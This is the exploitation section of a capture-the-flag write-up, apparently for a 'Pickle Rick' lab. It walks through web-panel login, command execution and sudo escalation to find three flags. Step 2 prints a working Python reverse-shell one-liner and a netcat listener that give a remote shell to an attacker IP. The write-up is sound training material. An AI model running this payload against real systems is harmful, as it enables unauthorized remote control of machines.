## 💥 Exploitation

### Step 1: Initial Access and First Ingredient
- I opened a browser and attempted to use the username provided and "Wubbalubbadubdub" from robots.txt
- This actually let me in which took me to a GUI with the following tabs: Commands, Potions, Creatures, Potions, Beth Clone Notes
- I tried running `ls -la` in the commands which gave me the "Sup3rS3cretPickl3Ingred.txt" file
- I tried `cat Sup3rS3cretPickl3Ingred.txt` but it said command disabled to make it harder for future pickle rick
    - Tried with `sudo`, but same output
- Finally, tried to just open the txt file in the browser and got it "mr. meeseek hair"
- Found flag at `http://10.144.171.223/Sup3rS3cretPickl3Ingred.txt`

**Commands:**
```bash
ls -la
cat Sup3rS3cretPickl3Ingred.txt
sudo cat Sup3rS3cretPickl3Ingred.txt
```

### Step 2: Ncat Listener/Py3 Reverse Shell
- I opened clue.txt and found that the second ingredient is in the file system somewhere (very helpful...)
- I looked around and eventually found /home/rick/second ingredient
- Tried `cat "/home/rick/second ingredients"`, but of course that didn't work
- At this point, I'm going to just set up a netcat listener/py3 reverse shell
    - On attack machine: `nc -lvnp 4444`
    - On web server: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.144.106.17",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- This gives me a shell for the lab (no more command restrictions)
- I just `cat "/home/rick/second ingredients"` and get "1 jerry tear"

**Commands:**
```bash
cat "/home/rick/second ingredients"
nc -lvnp 4444
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.144.106.17",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
cat "/home/rick/second ingredients
```

### Step 3: Privilege Escalation
- At this point, I was kind of spoiled as for where the last ingredient was going to be
- I knew it was in /root, so I tried `ls root`, but that didn't work, as I didn't have the right permissions
- So naturally, the next thing to try was `sudo ls root`, which surprisingly worked and showed "3rd.txt"
- I tried `cat /root/3rd.txt` which also denied my permissions, obviously
    - I sudoed and got "fleeb juice"

**Commands:**
```bash
sudo ls root
sudo /root/3rd.txt
```
